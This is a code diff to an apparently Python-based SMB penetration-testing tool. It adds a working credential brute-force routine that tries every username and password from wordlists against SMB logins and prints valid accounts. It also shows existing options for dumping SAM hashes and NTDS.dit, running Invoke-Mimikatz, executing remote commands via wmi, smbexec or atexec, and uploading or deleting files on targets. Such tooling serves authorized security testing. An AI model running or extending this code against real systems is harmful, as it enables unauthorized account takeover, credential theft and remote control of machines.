@@ -2238,6 +2238,23 @@ def dir_list(files,ip,path,pattern):
                     print ("//%s/%s/%s" % (ip, path.replace("//",""), result.get_longname().encode('utf8')))
     return 0
 
+def bruteforce(host, smb, s_name, domain):
+    usernames = open(args.bruteforce[0], 'r')
+    passwords = open(args.bruteforce[1], 'r')
+
+    for user in usernames:
+        passwords.seek(0)
+        for passw in passwords:
+            try:
+                #print "Trying {}:{}".format(user.strip(),passw.strip())
+                smb.login(user.strip(), passw.strip(), domain, '', '')
+                print "[+] {}:{} {} Found valid account! Username: {} Password: {}".format(host, args.port, s_name, user.strip(), passw.strip())
+                if args.exhaust is False:
+                    return
+            except SessionError as e:
+                if "STATUS_LOGON_FAILURE" in e.message:
+                    pass
+
 def normalize_path(path):
     path = r'{}'.format(path)
     path = ntpath.normpath(path)
@@ -2313,6 +2330,12 @@ def connect(host):
             pass
         except socket.error:
             smb = SMBConnection(host, host, None, args.port)
+
+        if args.bruteforce:
+            start_time = time()
+            print "[+] {}:{} {} Started SMB bruteforce".format(host, args.port, s_name)
+            bruteforce(host, smb, s_name, domain)
+            print "[+] {}:{} {} Finished SMB bruteforce (Completed in: {})".format(host, args.port, s_name, time() - start_time)
 
         if args.user is not None and (args.passwd is not None or args.hash is not None):
             lmhash = ''
@@ -2500,8 +2523,8 @@ if __name__ == '__main__':
     parser.add_argument("target", nargs=1, type=str, help="The target range or CIDR identifier")
 
     rgroup = parser.add_argument_group("Credential Gathering", "Options for gathering credentials")
-    rgroup.add_argument("--sam", action='store_true', dest='sam', help='Dump SAM hashes from target systems')
-    rgroup.add_argument("--mimikatz", action='store_true', dest='mimikatz', help='Run Invoke-Mimikatz on target systems')
+    rgroup.add_argument("--sam", action='store_true', help='Dump SAM hashes from target systems')
+    rgroup.add_argument("--mimikatz", action='store_true', help='Run Invoke-Mimikatz on target systems')
     rgroup.add_argument("--ntds", choices={'vss', 'drsuapi', 'ninja'}, help="Dump the NTDS.dit from target DCs using the specifed method\n(drsuapi is the fastest)")
 
     egroup = parser.add_argument_group("Mapping/Enumeration", "Options for Mapping/Enumerating")
@@ -2510,6 +2533,10 @@ if __name__ == '__main__':
     egroup.add_argument("--users", action='store_true', dest='enum_users', help='Enumerate users')
     egroup.add_argument("--lusers", action='store_true', dest='enum_lusers', help='Enumerate logged on users')
 
+    dgroup = parser.add_argument_group("Account Bruteforcing", "Options for bruteforcing SMB accounts")
+    dgroup.add_argument("--bruteforce", nargs=2, metavar=('USER_FILE', 'PASS_FILE'), help="Your wordlists containing Usernames and Passwords")
+    dgroup.add_argument("--exhaust", action='store_true', help="Don't stop on first valid account found")
+
     sgroup = parser.add_argument_group("Spidering", "Options for spidering shares")
     sgroup.add_argument("--spider", metavar='FOLDER', type=str, default='', help='Folder to spider (defaults to share root dir)')
     sgroup.add_argument("--pattern", type=str, default= '', help='Pattern to search for in filenames and folders')
@@ -2517,15 +2544,15 @@ if __name__ == '__main__':
     sgroup.add_argument("--depth", type=int, default=1, help='Spider recursion depth (default: 1)')
 
     cgroup = parser.add_argument_group("Command Execution", "Options for executing commands")
-    cgroup.add_argument('--execm', choices={"wmi", "smbexec", "atexec"}, dest="execm", default="smbexec", help="Method to execute the command (default: smbexec)")
+    cgroup.add_argument('--execm', choices={"wmi", "smbexec", "atexec"}, default="smbexec", help="Method to execute the command (default: smbexec)")
     cgroup.add_argument("-x", metavar="COMMAND", dest='command', help="Execute the specified command")
     cgroup.add_argument("-X", metavar="PS_COMMAND", dest='pscommand', help='Excute the specified powershell command')
 
     bgroup = parser.add_argument_group("Filesystem interaction", "Options for interacting with filesystems")
-    bgroup.add_argument("--list", dest='list', metavar='PATH', help='List contents of a directory')
-    bgroup.add_argument("--download", dest='download', metavar="PATH", help="Download a file from the remote systems")
-    bgroup.add_argument("--upload", nargs=2, dest='upload', metavar=('SRC', 'DST'), help="Upload a file to the remote systems")
-    bgroup.add_argument("--delete", dest="delete", metavar="PATH", help="Delete a remote file")
+    bgroup.add_argument("--list", metavar='PATH', help='List contents of a directory')
+    bgroup.add_argument("--download", metavar="PATH", help="Download a file from the remote systems")
+    bgroup.add_argument("--upload", nargs=2, metavar=('SRC', 'DST'), help="Upload a file to the remote systems")
+    bgroup.add_argument("--delete", metavar="PATH", help="Delete a remote file")
 
     args = parser.parse_args()
 
